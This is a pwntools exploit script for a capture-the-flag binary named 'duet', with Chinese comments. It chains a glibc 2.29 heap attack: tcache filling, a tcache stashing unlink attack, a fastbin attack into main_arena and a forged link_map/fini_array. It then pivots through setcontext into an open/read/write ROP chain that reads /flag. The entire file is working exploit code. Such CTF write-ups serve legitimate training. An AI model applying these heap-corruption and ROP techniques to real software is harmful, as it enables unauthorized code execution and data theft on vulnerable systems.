# -*- coding:utf-8 -*-

from pwn import *

context.log_level = 'debug'
sh = process('./duet')
# sh = remote('pwnable.org',12356)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.29.so')
malloc_hook_s = libc.sym['__malloc_hook']
#l_addr_offset = 0x222190
l_addr_offset = 0x21b190

def add(index, size, content):
    sh.sendlineafter(': ', '1')
    if(index == 0):
        sh.sendlineafter('Instrument: ', '琴')
    elif(index == 1):
        sh.sendlineafter('Instrument: ', '瑟')
    sh.sendlineafter('Duration: ', str(size))
    sh.sendafter('Score: ', content)

def delete(index):
    sh.sendlineafter(': ', '2')
    if(index == 0):
        sh.sendlineafter('Instrument: ', '琴')
    elif(index == 1):
        sh.sendlineafter('Instrument: ', '瑟')


def show(index):
    sh.sendlineafter(': ', '3')
    if(index == 0):
        sh.sendlineafter('Instrument: ', '琴')
    elif(index == 1):
        sh.sendlineafter('Instrument: ', '瑟')

def backdoor(size):
    sh.sendlineafter(': ', '5')
    sh.sendlineafter(': ', str(size))

for i in range(6):
    add(0, 0x80, 'a' * 0x80)
    delete(0)

for i in range(7):
    add(0, 0xd0, 'a' * 0xd0)
    delete(0)

for i in range(7):
    add(0, 0x230, 'a' * 0x230)
    delete(0)


for i in range(7):
    add(0, 0x280, 'a' * 0x280)
    delete(0)

for i in range(7):
    add(0, 0x2f8, 'a' * 0x2f8)
    delete(0)

for i in range(7):
    add(0, 0x3f8, 'a' * 0x3f8)
    delete(0)

for i in range(7):
    add(0, 0xf0, 'a' * 0xf0)
    delete(0)

add(0, 0x2f8, 'a' * 0x2f8)
add(1, 0x3f8, 'b' * 0x70 + p64(0x2f0) + p64(0x20) + 'f' * (0x280 - 0x80) + (p64(0) + p64(0x21)) * 7 + p64(0x300) + p64(0x21) + p64(0x21) * int((0x3f8 - 0x300)/8))
delete(0)
# delete(1)
backdoor(0xf1)
add(0, 0x280, 'c' * 0x268 + p64(0x301) + 'd' * 0x10)
show(1)
sh.recvuntil('d' * 0x10)
sh.recvn(0x10)
main_arena_xx = u64(sh.recv(6).ljust(0x8,'\x00'))
malloc_hook_addr = (main_arena_xx & 0xFFFFFFFFFFFFF000) + (malloc_hook_s & 0xFFF)
libc_base = malloc_hook_addr - malloc_hook_s
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
pop_rax = libc_base + 0x0000000000047cf8
pop_rdi = libc_base + 0x0000000000026542
pop_rsi = libc_base + 0x0000000000026f9e
pop_rdx = libc_base + 0x000000000012bda6
syscall_ret = read_addr + 0xF
ret = libc_base + 0x000000000002535f
bss = libc_base + libc.bss()
global_fast_max = libc_base + 0x1e7600
print hex(main_arena_xx)
print 'libc_base=',hex(libc_base)
print 'global_fast_max=',hex(global_fast_max)
libc_addr = libc_base
# pause()
delete(0)

delete(1)
add(1, 0x200, 'h' * 0x200)
add(0, 0x260, p64(0x21) * (0x46+6))
delete(1)

add(1, 0xd0, 's' * 0x50 + p64(0) + p64(0x241) + 's' * 0x70)
# pause()
delete(0)
show(1)
sh.recvuntil('s' * 0x50)
sh.recvn(0x10)
heap_addr = u64(sh.recvn(8))
success('heap_addr: ' + hex(heap_addr))
add(0, 0x1a0, 'u' * 0x70 + p64(0) + p64(0x21) + 'u' * 0x120)
delete(1)
add(1, 0xd0, 'q' * 0x50 + p64(0) + p64(0x291) + 'q' * 0x70)
delete(0)
# pause()
add(0, 0x280, 'w' * 0x70 + p64(0x21) * 6 + 'w' * 0x100 + p64(0) + p64(0x101) + p64(heap_addr) + p64(libc_addr + 0x1e7600 + 4 - 0x10) + 'w' * (0x250 - 0x1b0) + p64(0) + p64(0x101) + p64(libc_addr + 0x1e4d20) + p64(heap_addr - 0xc0))
# libc_addr + 0x1e7600 - 0x10 + 4
# delete(0)
delete(1)
add(1, 0xd0, 'q' * 0x50 + p64(0) + p64(0x401) + 'q' * 0x70)
delete(1)
add(1, 0x3f0, p64(0x21) * int(0x3f0/8))
delete(1)
add(1, 0x80, 'a' * 0x80) #触发Tcache Stashing Unlink Attack
delete(0) #接下来，这个chunk被放入fastbin，在main_arena留下一个1，这个1可以用来伪造fastbin的size
delete(1)
add(0, 0x3f0, 'o' * 0x260 + p64(0) + p64(0x101) + p64(libc_addr + 0x1e4c3F) + p64(0) + p64(0x21) * int((0x3f0 - 0x280)/8)) #将main_arena里伪造fastbin链接到现有的fastbin里
# pause()
add(1, 0xf0, 'a' * 0xf0)
delete(0)

payload =  'z' * 0x1 + '\x00' * 0x50 + p64(libc_addr + l_addr_offset - 0x14) #top chunk指向linkmap->l_addr附近
payload += p64(0) + p64(libc_addr + 0x1e4ca0)*2  #修复unsorted bin
payload += p64(libc_addr + 0x1e4cb0)*2 + p64(libc_addr + 0x1e4cc0)*2 + p64(libc_addr + 0x1e4cd0)*2
payload += p64(libc_addr + 0x1e4ce0)*2 + p64(libc_addr + 0x1e4cf0)*2 + p64(libc_addr + 0x1e4d00)*2 + p64(libc_addr + 0x1e4d10)*2  + p64(0)*2
add(0, 0xf1,payload) #fastbin attack申请到main_arena里，控制main_arena
delete(1)
setcontext_addr = libc_addr + libc.sym['setcontext']

#伪造link_map
payload = '\x00'*0x4
payload += p64(libc_base + l_addr_offset + 0x20) #fini_array的基址
payload += '\x00'*0x10
payload += p64(libc_base + l_addr_offset + 0x5A0)
payload += p64(0)
payload += p64(libc_addr + l_addr_offset)
#此处，伪造一系列需要执行的函数虚表

payload += p64(setcontext_addr + 0x35) #函数1，setcontext做栈迁移
payload += p64(ret) #函数0，使得rdx指向link_map内部

#这里布置rop，正好0x90
rop= p64(0) + p64(pop_rsi) + p64(libc_base + l_addr_offset + 0x70) + p64(pop_rdx) + p64(0x100) + p64(read_addr)
rop = rop.ljust(0x90,'a')
payload += rop
#这里布置rsp
payload += p64(libc_base + l_addr_offset + 0x40)
#这里布置[rdx+0xA8]
payload += p64(pop_rdi)

payload = payload.ljust(0x114,'a')
payload += p64(libc_addr + l_addr_offset + 0x110) ##fini_array的偏移的指针
payload += p64(0) ##fini_array的偏移
payload += p64(libc_addr + l_addr_offset + 0x120) #函数个数变量的指针
payload += p64(0x20) #函数个数

payload = payload.ljust(0x1E0,'a')
add(1,0x1E0,payload)
#执行rop，输入后续的主rop
sh.sendlineafter(':','6')

flag_str = libc_addr + l_addr_offset + 0x118
rop = p64(pop_rdi) + p64(flag_str) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(0x2) + p64(syscall_ret)
rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(0x30) + p64(read_addr)
rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(0x30) + p64(write_addr)
rop += '/flag\x00'
sh.sendline(rop)

sh.interactive()